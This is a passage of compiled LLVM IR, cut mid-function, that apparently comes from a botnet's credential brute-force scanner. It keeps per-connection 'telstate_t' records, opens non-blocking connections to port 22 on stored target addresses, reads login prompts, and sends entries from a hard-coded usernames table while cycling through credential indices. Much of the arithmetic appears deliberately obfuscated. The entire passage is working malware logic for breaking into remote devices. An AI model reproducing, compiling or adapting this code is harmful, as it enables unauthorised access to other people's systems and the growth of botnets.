; <label>:111:                                    ; preds = %79
  %112 = load i32, i32* %2, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 5
  %116 = load i8, i8* %115, align 1
  %117 = sub i8 %116, -123
  %118 = add i8 %117, 1
  %119 = add i8 %118, -123
  %120 = add i8 %116, 1
  store i8 %119, i8* %115, align 1
  %121 = load i32, i32* %2, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 5
  %125 = load i8, i8* %124, align 1
  %126 = zext i8 %125 to i64
  %127 = icmp eq i64 %126, 18
  br i1 %127, label %128, label %141

; <label>:128:                                    ; preds = %111
  %129 = load i32, i32* %2, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %130
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %131, i32 0, i32 5
  store i8 0, i8* %132, align 1
  %133 = load i32, i32* %2, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %134
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %135, i32 0, i32 4
  %137 = load i8, i8* %136, align 2
  %138 = sub i8 0, 1
  %139 = sub i8 %137, %138
  %140 = add i8 %137, 1
  store i8 %139, i8* %136, align 2
  br label %141

; <label>:141:                                    ; preds = %128, %111
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 4
  %146 = load i8, i8* %145, align 2
  %147 = zext i8 %146 to i64
  %148 = icmp eq i64 %147, 10
  br i1 %148, label %149, label %154

; <label>:149:                                    ; preds = %141
  %150 = load i32, i32* %2, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 3
  store i8 1, i8* %153, align 1
  br label %1992

; <label>:154:                                    ; preds = %141
  br label %155

; <label>:155:                                    ; preds = %154, %91
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %156, align 4
  %157 = call zeroext i16 @htons(i16 zeroext 22) #13
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %157, i16* %158, align 2
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %160 = getelementptr inbounds [8 x i8], [8 x i8]* %159, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %160, i8 0, i64 8, i32 4, i1 false)
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 1
  %165 = load i32, i32* %164, align 4
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 %165, i32* %167, align 4
  %168 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %169 = load i32, i32* %2, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 0
  store i32 %168, i32* %172, align 16
  %173 = load i32, i32* %2, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %174
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = icmp eq i32 %177, -1
  br i1 %178, label %179, label %180

; <label>:179:                                    ; preds = %155
  br label %1992

; <label>:180:                                    ; preds = %155
  %181 = load i32, i32* %2, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %182
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %183, i32 0, i32 0
  %185 = load i32, i32* %184, align 16
  %186 = load i32, i32* %2, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 16
  %191 = call i32 (i32, i32, ...) @fcntl(i32 %190, i32 3, i8* null)
  %192 = xor i32 %191, -1
  %193 = xor i32 2048, -1
  %194 = xor i32 229239490, -1
  %195 = and i32 %192, 229239490
  %196 = and i32 %191, %194
  %197 = and i32 %193, 229239490
  %198 = and i32 2048, %194
  %199 = or i32 %195, %196
  %200 = or i32 %197, %198
  %201 = xor i32 %199, %200
  %202 = or i32 %192, %193
  %203 = xor i32 %202, -1
  %204 = or i32 229239490, %194
  %205 = and i32 %203, %204
  %206 = or i32 %201, %205
  %207 = or i32 %191, 2048
  %208 = call i32 (i32, i32, ...) @fcntl(i32 %185, i32 4, i32 %206)
  %209 = load i32, i32* %2, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 16
  %214 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %215 = call i32 @connect(i32 %213, %struct.sockaddr* %214, i32 16)
  %216 = icmp eq i32 %215, -1
  br i1 %216, label %217, label %232

; <label>:217:                                    ; preds = %180
  %218 = call i32* @__errno_location() #13
  %219 = load i32, i32* %218, align 4
  %220 = icmp ne i32 %219, 115
  br i1 %220, label %221, label %232

; <label>:221:                                    ; preds = %217
  %222 = load i32, i32* %2, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %223
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %224, i32 0, i32 0
  %226 = load i32, i32* %225, align 16
  %227 = call i32 @sclose(i32 %226)
  %228 = load i32, i32* %2, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 3
  store i8 1, i8* %231, align 1
  br label %241

; <label>:232:                                    ; preds = %217, %180
  %233 = load i32, i32* %2, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %234
  %236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %235, i32 0, i32 2
  store i8 1, i8* %236, align 8
  %237 = load i32, i32* %2, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 6
  store i32 0, i32* %240, align 4
  br label %241

; <label>:241:                                    ; preds = %232, %221
  br label %1991

; <label>:242:                                    ; preds = %72
  %243 = load i32, i32* %2, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 6
  %247 = load i32, i32* %246, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %242
  %250 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %251 = load i32, i32* %2, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %252
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %253, i32 0, i32 6
  store i32 %250, i32* %254, align 4
  br label %255

; <label>:255:                                    ; preds = %249, %242
  br label %256

; <label>:256:                                    ; preds = %255
  %257 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %258 = getelementptr inbounds [16 x i64], [16 x i64]* %257, i64 0, i64 0
  %259 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %258) #2, !srcloc !6
  %260 = extractvalue { i64, i64* } %259, 0
  %261 = extractvalue { i64, i64* } %259, 1
  %262 = trunc i64 %260 to i32
  store i32 %262, i32* %12, align 4
  %263 = ptrtoint i64* %261 to i64
  %264 = trunc i64 %263 to i32
  store i32 %264, i32* %13, align 4
  br label %265

; <label>:265:                                    ; preds = %256
  br label %266

; <label>:266:                                    ; preds = %265
  %267 = load i32, i32* %2, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 16
  %272 = srem i32 %271, 64
  %273 = zext i32 %272 to i64
  %274 = shl i64 1, %273
  %275 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %276 = load i32, i32* %2, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 16
  %281 = sdiv i32 %280, 64
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds [16 x i64], [16 x i64]* %275, i64 0, i64 %282
  %284 = load i64, i64* %283, align 8
  %285 = and i64 %284, %274
  %286 = xor i64 %284, %274
  %287 = or i64 %285, %286
  %288 = or i64 %284, %274
  store i64 %287, i64* %283, align 8
  %289 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %289, align 8
  %290 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %290, align 8
  %291 = load i32, i32* %2, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 16
  %296 = sub i32 0, 1
  %297 = sub i32 %295, %296
  %298 = add nsw i32 %295, 1
  %299 = call i32 @select(i32 %297, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %299, i32* %3, align 4
  %300 = load i32, i32* %3, align 4
  %301 = icmp eq i32 %300, 1
  br i1 %301, label %302, label %362

; <label>:302:                                    ; preds = %266
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %303 = load i32, i32* %2, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = bitcast i32* %7 to i8*
  %309 = call i32 @getsockopt(i32 %307, i32 1, i32 4, i8* %308, i32* %6) #2
  %310 = load i32, i32* %7, align 4
  %311 = icmp ne i32 %310, 0
  br i1 %311, label %312, label %327

; <label>:312:                                    ; preds = %302
  %313 = load i32, i32* %2, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %314
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %315, i32 0, i32 0
  %317 = load i32, i32* %316, align 16
  %318 = call i32 @sclose(i32 %317)
  %319 = load i32, i32* %2, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 2
  store i8 0, i8* %322, align 8
  %323 = load i32, i32* %2, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %324
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %325, i32 0, i32 3
  store i8 1, i8* %326, align 1
  br label %361

; <label>:327:                                    ; preds = %302
  %328 = load i32, i32* %2, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %329
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %330, i32 0, i32 0
  %332 = load i32, i32* %331, align 16
  %333 = load i32, i32* %2, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %334
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %335, i32 0, i32 0
  %337 = load i32, i32* %336, align 16
  %338 = call i32 (i32, i32, ...) @fcntl(i32 %337, i32 3, i8* null)
  %339 = xor i32 -2049, -1
  %340 = xor i32 %338, %339
  %341 = and i32 %340, %338
  %342 = and i32 %338, -2049
  %343 = call i32 (i32, i32, ...) @fcntl(i32 %332, i32 4, i32 %341)
  %344 = load i32, i32* %2, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %345
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %346, i32 0, i32 6
  store i32 0, i32* %347, align 4
  %348 = load i32, i32* %2, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %349
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %350, i32 0, i32 7
  store i16 0, i16* %351, align 16
  %352 = load i32, i32* %2, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %353
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %354, i32 0, i32 8
  %356 = load i8*, i8** %355, align 8
  call void @llvm.memset.p0i8.i64(i8* %356, i8 0, i64 1024, i32 1, i1 false)
  %357 = load i32, i32* %2, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 2
  store i8 2, i8* %360, align 8
  br label %1992

; <label>:361:                                    ; preds = %312
  br label %381

; <label>:362:                                    ; preds = %266
  %363 = load i32, i32* %3, align 4
  %364 = icmp eq i32 %363, -1
  br i1 %364, label %365, label %380

; <label>:365:                                    ; preds = %362
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 0
  %370 = load i32, i32* %369, align 16
  %371 = call i32 @sclose(i32 %370)
  %372 = load i32, i32* %2, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %373
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %374, i32 0, i32 2
  store i8 0, i8* %375, align 8
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 3
  store i8 1, i8* %379, align 1
  br label %380

; <label>:380:                                    ; preds = %365, %362
  br label %381

; <label>:381:                                    ; preds = %380, %361
  %382 = load i32, i32* %2, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 6
  %386 = load i32, i32* %385, align 4
  %387 = sub i32 0, %386
  %388 = sub i32 0, 10
  %389 = add i32 %387, %388
  %390 = sub i32 0, %389
  %391 = add i32 %386, 10
  %392 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %393 = icmp ult i32 %390, %392
  br i1 %393, label %394, label %409

; <label>:394:                                    ; preds = %381
  %395 = load i32, i32* %2, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 0
  %399 = load i32, i32* %398, align 16
  %400 = call i32 @sclose(i32 %399)
  %401 = load i32, i32* %2, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 2
  store i8 0, i8* %404, align 8
  %405 = load i32, i32* %2, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %406
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %407, i32 0, i32 3
  store i8 1, i8* %408, align 1
  br label %409

; <label>:409:                                    ; preds = %394, %381
  br label %1991

; <label>:410:                                    ; preds = %72
  %411 = load i32, i32* %2, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 6
  %415 = load i32, i32* %414, align 4
  %416 = icmp eq i32 %415, 0
  br i1 %416, label %417, label %423

; <label>:417:                                    ; preds = %410
  %418 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %419 = load i32, i32* %2, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 6
  store i32 %418, i32* %422, align 4
  br label %423

; <label>:423:                                    ; preds = %417, %410
  %424 = load i32, i32* %2, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 16
  %429 = load i32, i32* %2, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %430
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %431, i32 0, i32 8
  %433 = load i8*, i8** %432, align 8
  %434 = load i32, i32* %2, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 7
  %438 = load i16, i16* %437, align 16
  %439 = zext i16 %438 to i32
  %440 = call i32 @readUntil(i32 %428, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %433, i32 1024, i32 %439)
  %441 = icmp ne i32 %440, 0
  br i1 %441, label %442, label %474

; <label>:442:                                    ; preds = %423
  %443 = load i32, i32* %2, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 6
  store i32 0, i32* %446, align 4
  %447 = load i32, i32* %2, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %448
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %449, i32 0, i32 7
  store i16 0, i16* %450, align 16
  %451 = load i32, i32* %2, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %452
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %453, i32 0, i32 8
  %455 = load i8*, i8** %454, align 8
  %456 = call i8* @strstr(i8* %455, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %457 = icmp ne i8* %456, null
  br i1 %457, label %458, label %463

; <label>:458:                                    ; preds = %442
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 2
  store i8 5, i8* %462, align 8
  br label %468

; <label>:463:                                    ; preds = %442
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 2
  store i8 3, i8* %467, align 8
  br label %468

; <label>:468:                                    ; preds = %463, %458
  %469 = load i32, i32* %2, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 8
  %473 = load i8*, i8** %472, align 8
  call void @llvm.memset.p0i8.i64(i8* %473, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:474:                                    ; preds = %423
  %475 = load i32, i32* %2, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %476
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %477, i32 0, i32 0
  %479 = load i32, i32* %478, align 16
  %480 = load i32, i32* %2, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 8
  %484 = load i8*, i8** %483, align 8
  %485 = load i32, i32* %2, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %486
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %487, i32 0, i32 7
  %489 = load i16, i16* %488, align 16
  %490 = zext i16 %489 to i32
  %491 = call i32 @readUntil(i32 %479, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %484, i32 1024, i32 %490)
  %492 = icmp ne i32 %491, 0
  br i1 %492, label %493, label %529

; <label>:493:                                    ; preds = %474
  %494 = load i32, i32* %2, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 6
  store i32 0, i32* %497, align 4
  %498 = load i32, i32* %2, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 7
  store i16 0, i16* %501, align 16
  %502 = load i32, i32* %2, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 8
  %506 = load i8*, i8** %505, align 8
  %507 = call i8* @strstr(i8* %506, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %508 = icmp ne i8* %507, null
  br i1 %508, label %509, label %514

; <label>:509:                                    ; preds = %493
  %510 = load i32, i32* %2, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %511
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %512, i32 0, i32 2
  store i8 5, i8* %513, align 8
  br label %519

; <label>:514:                                    ; preds = %493
  %515 = load i32, i32* %2, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %516
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %517, i32 0, i32 2
  store i8 3, i8* %518, align 8
  br label %519

; <label>:519:                                    ; preds = %514, %509
  %520 = load i32, i32* %2, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 8
  %524 = load i8*, i8** %523, align 8
  call void @llvm.memset.p0i8.i64(i8* %524, i8 0, i64 1024, i32 1, i1 false)
  %525 = load i32, i32* %2, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %526
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %527, i32 0, i32 2
  store i8 3, i8* %528, align 8
  br label %1992

; <label>:529:                                    ; preds = %474
  %530 = load i32, i32* %2, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %531
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %532, i32 0, i32 8
  %534 = load i8*, i8** %533, align 8
  %535 = call i64 @strlen(i8* %534) #10
  %536 = trunc i64 %535 to i16
  %537 = load i32, i32* %2, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 7
  store i16 %536, i16* %540, align 16
  br label %541

; <label>:541:                                    ; preds = %529
  br label %542

; <label>:542:                                    ; preds = %541
  %543 = load i32, i32* %2, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %544
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %545, i32 0, i32 6
  %547 = load i32, i32* %546, align 4
  %548 = sub i32 %547, 686068521
  %549 = add i32 %548, 10
  %550 = add i32 %549, 686068521
  %551 = add i32 %547, 10
  %552 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %553 = icmp ult i32 %550, %552
  br i1 %553, label %554, label %569

; <label>:554:                                    ; preds = %542
  %555 = load i32, i32* %2, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 0
  %559 = load i32, i32* %558, align 16
  %560 = call i32 @sclose(i32 %559)
  %561 = load i32, i32* %2, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %562
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %563, i32 0, i32 2
  store i8 0, i8* %564, align 8
  %565 = load i32, i32* %2, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %567, i32 0, i32 3
  store i8 1, i8* %568, align 1
  br label %569

; <label>:569:                                    ; preds = %554, %542
  br label %1991

; <label>:570:                                    ; preds = %72
  %571 = load i32, i32* %2, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %572
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %573, i32 0, i32 0
  %575 = load i32, i32* %574, align 16
  %576 = load i32, i32* %2, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %577
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %578, i32 0, i32 4
  %580 = load i8, i8* %579, align 2
  %581 = zext i8 %580 to i64
  %582 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %581
  %583 = load i8*, i8** %582, align 8
  %584 = load i32, i32* %2, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 4
  %588 = load i8, i8* %587, align 2
  %589 = zext i8 %588 to i64
  %590 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %589
  %591 = load i8*, i8** %590, align 8
  %592 = call i64 @strlen(i8* %591) #10
  %593 = call i64 @send(i32 %575, i8* %583, i64 %592, i32 16384)
  %594 = icmp slt i64 %593, 0
  br i1 %594, label %595, label %610

; <label>:595:                                    ; preds = %570
  %596 = load i32, i32* %2, align 4
  %597 = sext i32 %596 to i64
